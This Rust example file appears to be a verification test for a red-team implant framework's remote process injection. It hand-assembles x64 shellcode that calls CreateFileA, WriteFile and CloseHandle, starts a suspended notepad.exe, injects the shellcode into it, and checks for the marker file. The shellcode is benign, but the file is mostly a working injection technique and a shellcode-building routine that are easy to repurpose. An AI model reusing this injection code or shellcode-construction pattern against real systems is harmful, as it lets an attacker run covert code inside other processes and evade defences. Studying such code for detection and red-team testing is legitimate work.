//! Inject verification: injects shellcode that creates a file into a target process.
//! Run with: cargo run --example test_inject --features "Inject,source"
//! Requires administrator privileges.

#[cfg(target_os = "windows")]
fn main() {
    use windows::core::{PCSTR, PWSTR};
    use windows::Win32::Foundation::CloseHandle;
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Threading::{
        CreateProcessW, TerminateProcess, CREATE_NO_WINDOW, CREATE_SUSPENDED, PROCESS_INFORMATION,
        STARTUPINFOW,
    };

    const TEST_FILE: &str = "C:\\temp\\inject_test.txt";
    const TEST_CONTENT: &[u8] = b"inject ok";

    // Ensure target directory exists
    let _ = std::fs::create_dir_all("C:\\temp");
    let _ = std::fs::remove_file(TEST_FILE);

    // Resolve kernel32 API addresses
    let kernel32 = unsafe { GetModuleHandleA(PCSTR(b"kernel32.dll\0".as_ptr())).unwrap() };
    let addr_create =
        unsafe { GetProcAddress(kernel32, PCSTR(b"CreateFileA\0".as_ptr())).unwrap() as u64 };
    let addr_write =
        unsafe { GetProcAddress(kernel32, PCSTR(b"WriteFile\0".as_ptr())).unwrap() as u64 };
    let addr_close =
        unsafe { GetProcAddress(kernel32, PCSTR(b"CloseHandle\0".as_ptr())).unwrap() as u64 };

    println!("CreateFileA  @ 0x{:016x}", addr_create);
    println!("WriteFile    @ 0x{:016x}", addr_write);
    println!("CloseHandle  @ 0x{:016x}", addr_close);

    // Build shellcode
    let shellcode = build_shellcode(
        addr_create,
        addr_write,
        addr_close,
        TEST_FILE.as_bytes(),
        TEST_CONTENT,
    );
    println!("shellcode size: {} bytes", shellcode.len());

    // Spawn suspended notepad as target
    let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
    let mut cmd: Vec<u16> = "notepad.exe\0".encode_utf16().collect();

    let ok = unsafe {
        CreateProcessW(
            None,
            PWSTR(cmd.as_mut_ptr()),
            None,
            None,
            false,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            None,
            None,
            &si,
            &mut pi,
        )
    };
    if ok.is_err() {
        eprintln!("CreateProcess failed");
        return;
    }
    let pid = pi.dwProcessId;
    println!("target pid: {}", pid);

    // Inject
    match malefic_os_win::kit::inject::remote_inject(&shellcode, pid) {
        Ok(msg) => println!("inject result: {}", msg),
        Err(e) => {
            eprintln!("inject failed: {}", e);
            unsafe {
                TerminateProcess(pi.hProcess, 1).ok();
            }
            return;
        }
    }

    // Resume the main thread so the process stays alive while our thread runs
    unsafe {
        windows::Win32::System::Threading::ResumeThread(pi.hThread);
    }

    // Wait for shellcode to execute
    std::thread::sleep(std::time::Duration::from_secs(2));

    // Verify
    if std::path::Path::new(TEST_FILE).exists() {
        let content = std::fs::read_to_string(TEST_FILE).unwrap_or_default();
        println!("PASS - file created, content: \"{}\"", content);
    } else {
        println!("FAIL - file not created");
    }

    // Cleanup
    unsafe {
        TerminateProcess(pi.hProcess, 0).ok();
        CloseHandle(pi.hProcess).ok();
        CloseHandle(pi.hThread).ok();
    }
    let _ = std::fs::remove_file(TEST_FILE);
}

/// Build x64 shellcode: CreateFileA -> WriteFile -> CloseHandle
fn build_shellcode(
    create_file: u64,
    write_file: u64,
    close_handle: u64,
    filename: &[u8],
    content: &[u8],
) -> Vec<u8> {
    let mut sc = Vec::with_capacity(256);

    // Offsets (pre-calculated from fixed code layout):
    //   code ends at 0x84, filename at 0x84, content at 0x84+filename.len()+1
    let filename_with_nul = filename.len() + 1; // +1 for \0
    let content_start = 0x84u32 + filename_with_nul as u32;

    // lea rcx [rip+off] at 0x05, next_ip=0x0C => off = 0x84 - 0x0C
    let fname_off: u32 = 0x84 - 0x0C;
    // je done at 0x40, next_ip=0x42, done=0x7E => off = 0x7E - 0x42
    let je_off: u8 = 0x7E - 0x42;
    // lea rdx [rip+off] at 0x48, next_ip=0x4F => off = content_start - 0x4F
    let content_off: u32 = content_start - 0x4F;

    // -- Code section --
    sc.push(0x53); // push rbx
    sc.extend_from_slice(&[0x48, 0x83, 0xEC, 0x60]); // sub rsp, 0x60

    // CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)
    sc.extend_from_slice(&[0x48, 0x8D, 0x0D]); // lea rcx, [rip+off]
    sc.extend_from_slice(&fname_off.to_le_bytes());
    sc.extend_from_slice(&[0xBA, 0x00, 0x00, 0x00, 0x40]); // mov edx, 0x40000000
    sc.extend_from_slice(&[0x45, 0x33, 0xC0]); // xor r8d, r8d
    sc.extend_from_slice(&[0x45, 0x33, 0xC9]); // xor r9d, r9d
    sc.extend_from_slice(&[0xC7, 0x44, 0x24, 0x20, 0x02, 0x00, 0x00, 0x00]); // mov [rsp+0x20], 2
    sc.extend_from_slice(&[0xC7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x00, 0x00]); // mov [rsp+0x28], 0x80
    sc.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00]); // mov qword [rsp+0x30], 0
    sc.extend_from_slice(&[0x48, 0xB8]); // movabs rax, <CreateFileA>
    sc.extend_from_slice(&create_file.to_le_bytes());
    sc.extend_from_slice(&[0xFF, 0xD0]); // call rax

    sc.extend_from_slice(&[0x48, 0x83, 0xF8, 0xFF]); // cmp rax, -1
    sc.extend_from_slice(&[0x74, je_off]); // je done

    sc.extend_from_slice(&[0x48, 0x89, 0xC3]); // mov rbx, rax

    // WriteFile(handle, content, len, &written, NULL)
    sc.extend_from_slice(&[0x48, 0x89, 0xD9]); // mov rcx, rbx
    sc.extend_from_slice(&[0x48, 0x8D, 0x15]); // lea rdx, [rip+off]
    sc.extend_from_slice(&content_off.to_le_bytes());
    sc.extend_from_slice(&[0x41, 0xB8]); // mov r8d, <len>
    sc.extend_from_slice(&(content.len() as u32).to_le_bytes());
    sc.extend_from_slice(&[0x4C, 0x8D, 0x4C, 0x24, 0x40]); // lea r9, [rsp+0x40]
    sc.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00]); // mov qword [rsp+0x20], 0
    sc.extend_from_slice(&[0x48, 0xB8]); // movabs rax, <WriteFile>
    sc.extend_from_slice(&write_file.to_le_bytes());
    sc.extend_from_slice(&[0xFF, 0xD0]); // call rax

    // CloseHandle(handle)
    sc.extend_from_slice(&[0x48, 0x89, 0xD9]); // mov rcx, rbx
    sc.extend_from_slice(&[0x48, 0xB8]); // movabs rax, <CloseHandle>
    sc.extend_from_slice(&close_handle.to_le_bytes());
    sc.extend_from_slice(&[0xFF, 0xD0]); // call rax

    // done:
    sc.extend_from_slice(&[0x48, 0x83, 0xC4, 0x60]); // add rsp, 0x60
    sc.push(0x5B); // pop rbx
    sc.push(0xC3); // ret

    assert_eq!(sc.len(), 0x84, "code section size mismatch");

    // -- Data section --
    sc.extend_from_slice(filename);
    sc.push(0x00); // null terminator
    sc.extend_from_slice(content);

    sc
}

#[cfg(not(target_os = "windows"))]
fn main() {
    eprintln!("This test only runs on Windows");
}
